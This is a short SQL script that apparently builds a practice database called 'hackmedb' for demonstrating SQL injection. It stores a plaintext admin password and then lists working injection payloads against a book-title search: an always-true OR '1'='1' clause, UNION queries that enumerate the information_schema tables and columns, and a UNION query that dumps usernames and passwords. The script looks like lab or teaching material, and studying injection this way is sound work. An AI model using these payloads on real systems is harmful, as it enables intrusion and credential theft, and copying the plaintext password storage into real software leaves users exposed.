create database hackmedb
use hackmedb
CREATE TABLE books (id INT AUTO_INCREMENT PRIMARY KEY, name VARCHAR(255), author VARCHAR(255))
INSERT INTO books (name, author) VALUES ('Sapiens', 'Yuval Noah Harari')

CREATE TABLE users (id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(255), password VARCHAR(255), role VARCHAR(255))
INSERT INTO users (username, password, role) VALUES ('john', 'john123', 'ADMIN');

CREATE TABLE comments (id INT AUTO_INCREMENT PRIMARY KEY, comment VARCHAR(255), authorid int)
INSERT INTO comments (comment, authorid) VALUES ('This a comment from John', 1);
INSERT INTO comments (comment, authorid) VALUES ('This a second comment from John', 1);
INSERT INTO comments (comment, authorid) VALUES ('This a comment from Jane', 2);

SELECT * FROM books where NAME LIKE '%Sap%' OR '1'='1'; -- %'

SELECT * FROM books where NAME LIKE '%Sap%' UNION (SELECT 1, TABLE_NAME, TABLE_SCHEMA FROM information_schema.tables); -- %'

SELECT * FROM books where NAME LIKE '%Sap%' UNION (SELECT 2, COLUMN_NAME, 3 FROM information_schema.columns WHERE TABLE_NAME = 'users'); -- %'

SELECT * FROM books where NAME LIKE '%Sap%' UNION (SELECT id, username, password FROM users); -- %'